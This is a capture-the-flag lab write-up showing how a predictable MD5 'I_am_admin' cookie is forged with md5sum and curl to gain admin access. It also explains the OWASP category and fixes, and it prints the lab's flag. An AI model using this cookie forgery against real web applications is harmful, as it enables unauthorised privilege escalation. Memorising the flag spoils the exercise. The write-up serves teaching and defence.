# Cookie Manipulation - Admin Privilege Escalation

## Breach Type
**Broken Authentication / Insecure Cookie** — OWASP Top 10: A07:2021 Identification and Authentication Failures

## What is this Vulnerability?
**Cookie Manipulation** (or **Insecure Direct Object Reference via cookies**) is a vulnerability where the application stores authorization/authentication data in client-side cookies using a **predictable or reversible format**, allowing attackers to forge their own cookies and escalate privileges.

In simple terms: the server sets a cookie `I_am_admin=MD5("false")` in your browser. Since MD5 is a well-known hash and "false" is easily guessable, an attacker simply computes `MD5("true")` and replaces the cookie value. The server reads the cookie, sees "true", and grants admin access — no password needed.

This is fundamentally broken because **cookies are stored on the client side** — the user has full control over them. You should never trust any data that comes from the client.

### Why is it dangerous?
- **Privilege escalation**: A regular user becomes an administrator instantly
- **Authentication bypass**: No need to know any password — just forge the cookie
- **Session hijacking**: If session data is stored insecurely in cookies, attackers can impersonate any user
- **Data manipulation**: Forged cookies can change prices, user IDs, access levels
- **Trivial to exploit**: Anyone with browser DevTools (F12) can edit cookies in seconds

### Real-world impact
Insecure cookie-based authentication has been found in countless web applications. Apache Tomcat (CVE-2016-0714) had a cookie deserialization vulnerability. Many early e-commerce sites stored prices in cookies, allowing customers to pay $0.01 for expensive items.

## Where
Cookie: `I_am_admin=68934a3e9455fa72420237eb05902327`
URL: `http://<IP>/` (any page)

## How I Found It
1. Inspected the HTTP response headers and noticed a cookie being set:
   ```
   Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
   ```
2. The cookie value `68934a3e9455fa72420237eb05902327` is a 32-character hex string → **MD5 hash**.
3. Decoded the MD5 hash:
   ```
   68934a3e9455fa72420237eb05902327 → false
   ```
4. Logic: if `I_am_admin` = MD5("false"), then setting it to MD5("true") should grant admin access.

## Step-by-Step Exploitation

### Step 1: Identify the Cookie
When visiting any page, the server sets:
```
Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
```

### Step 2: Crack the MD5 Hash
```
68934a3e9455fa72420237eb05902327 → "false"
```
You can verify: `echo -n "false" | md5sum` → `68934a3e9455fa72420237eb05902327`

### Step 3: Compute MD5 of "true"
```bash
echo -n "true" | md5sum
```
Result: `b326b5062b2f0e69046810717534cb09`

### Step 4: Set the Modified Cookie
```bash
curl -s -b "I_am_admin=b326b5062b2f0e69046810717534cb09" "http://<IP>/index.php" | grep flag
```
Result:
```html
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3');</script>
```

## Flag
```
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## How to Test Manually
1. Open your browser and go to `http://<IP>/`
2. Open **Developer Tools** (F12) → **Application** tab → **Cookies**
3. Find the cookie `I_am_admin` with value `68934a3e9455fa72420237eb05902327`
4. Change the value to: `b326b5062b2f0e69046810717534cb09`
5. Refresh the page → An alert popup shows the flag

## How to Fix
- **Never store authorization data in client-side cookies** in a predictable/crackable format
- Use **server-side sessions** to track admin status
- Use **signed/encrypted cookies** (e.g., JWT with a secret key)
- Use **HMAC** to ensure cookie integrity
- Never use MD5 for security purposes — it's broken
- Implement proper **Role-Based Access Control (RBAC)** on the server

## OWASP Reference
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Broken Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/)
